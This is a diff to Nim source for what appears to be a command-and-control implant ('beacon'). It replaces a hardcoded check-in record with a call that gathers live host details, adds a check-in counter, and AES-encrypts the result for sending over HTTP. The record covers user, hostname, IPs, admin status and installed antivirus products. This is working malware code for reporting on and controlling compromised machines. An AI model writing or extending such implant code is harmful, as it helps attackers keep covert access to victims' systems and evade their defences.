@@ -3,33 +3,16 @@ import config, crypto
 import times
 import std/parseutils
 import utils
-
+import commands
 
 let client = newHttpClient()
-
+var checkin_payload: JsonNode
 proc sendCheckin*(id: string): string =
-    let checkin_payload = %*{
-      "id": id, #agent's id
-      "user": "kali",
-      "hostname": "kali", #name of the host in whcih the agent is residing
-      "os_version": "1.2.3",
-      "os_build": "327.112.1",
-      "architecture": "x64",
-      "process_id": "12323",
-      "process_name": "beacon",
-      "internal_ip": "127.0.0.1",
-      "external_ip": "127.0.0.1",
-      "domain": "workgroup",
-      "is_admin": "no",
-      "av_products":"defender",
-      "beacon_start_time":  $now(),
-      "first_checkin": $now(),
-      "implant_version": IMPLANT_VERSION,
-      "beacon_key": PER_BEACON_KEY,
-      "timestamp": $now(), #like last seen or last activity
-      "status": "Active",
-    }
-
+    
+    if CHECKIN_COUNTER == 0:
+      checkin_payload = checkin_command(id)          
+    
+    inc(CHECKIN_COUNTER)
     let key = hexToBytes(AES_KEY)
 
     let enc = encryptJson(checkin_payload, $key)
